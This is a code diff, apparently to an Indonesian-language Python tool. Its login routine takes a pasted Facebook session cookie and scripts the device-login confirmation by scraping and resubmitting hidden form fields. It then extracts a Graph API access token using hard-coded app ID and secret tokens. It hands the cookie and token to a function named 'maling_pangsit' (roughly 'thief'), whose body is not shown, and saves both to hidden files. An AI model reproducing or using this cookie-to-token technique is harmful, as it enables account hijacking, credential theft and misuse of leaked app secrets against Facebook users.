@@ -83,10 +83,9 @@ class Login:
         cok = input("[?] cookie : ");self.ubah_bahasa({"cookie": cok})
         try:
             data, data2 = {}, {}
-            link = self.ses.post("https://graph.facebook.com/v16.0/device/login/", data={"access_token": "661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e", "scope": ""}).json()
-            kode = link["code"];user = link["user_code"]
-            vers = par(self.ses.get(f"{self.url}/device", cookies={"cookie": cok}).content, "html.parser")
-            #exit(vers)
+            link = self.ses.post("https://graph.facebook.com/v2.6/device/login/", data={"access_token": "1348564698517390|007c0a9101b9e1c8ffab727666805038", "scope": ""}).json()
+            kode = link["code"];user = link["user_code"]; data, data2 = {}, {}
+            vers = par(self.ses.get(f"{self.url}/device?user_code={user}", cookies={"cookie": cok}).text, "html.parser")
             item = ["fb_dtsg","jazoest","qr"]
             for x in vers.find_all("input"):
                 if x.get("name") in item:
@@ -94,17 +93,18 @@ class Login:
                     data.update(aset)
             data.update({"user_code":user})
             meta = par(self.ses.post(self.url+vers.find("form", method="post").get("action"), data=data, cookies={"cookie": cok}).text, "html.parser")
-            xzxz  = meta.find("form",{"method":"post"})
-            for x in xzxz("input",{"value":True}):
-                try:
-                    if x["name"] == "__CANCEL__" :pass
-                    else:data2.update({x["name"]:x["value"]})
-                except:pass
-            xx = self.ses.post(f"{self.url}{xzxz['action']}", data=data2, cookies={"cookie":cok}).text
-            if "Sukses!" in str(xx):
-                tokz = self.ses.get(f"https://graph.facebook.com/v16.0/device/login_status?method=post&code={kode}&access_token=661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e").json()
-                self.maling_pangsit(cok, tokz["access_token"])
-                open(".cok.txt", "w").write(cok);open(".tok.txt", "w").write(tokz["access_token"])
+            xzxz = ["fb_dtsg","jazoest","scope","display","sdk","sdk_version","domain","sso_device","user_code","logger_id","auth_type","auth_nonce","code_challenge","code_challenge_method","encrypted_post_body","return_format[]"]
+            for xz in meta.find_all("input"):
+                if xz.get("name") in xzxz:
+                    data2.update({xz.get("name"):xz.get("value")})
+                else:pass
+            data2.update({"submit":"Konfirmasi"})
+            konfirmasi = self.ses.post(self.url+meta.find("form", method="post").get("action"), data=data2, cookies={"cookie": cok}).text
+            if "Login Anda sudah dikonfirmasi di" in konfirmasi or "Sukses!" in konfirmasi:
+                find = self.ses.get(f"https://graph.facebook.com/v2.6/device/login_status?method=post&code={kode}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback", cookies={"cookie": cok}).text
+                tokz = re.search('"access_token":"(.*?)"', find).group(1)
+                self.maling_pangsit(cok, tokz)
+                open(".cok.txt", "w").write(cok);open(".tok.txt", "w").write(tokz)
                 exit(f"[{M}!{N}] jalankan ulang perintah nya dengan ketik python log.py")
             else:prints(Panel("😔[bold red] Cookie kamu invalid", style="bold white", width=70));time.sleep(3);self.menu()
         except requests.exceptions.ConnectionError:prints(Panel("😭[bold red] Tidak ada koneksi internet", style="bold white", width=70));exit()
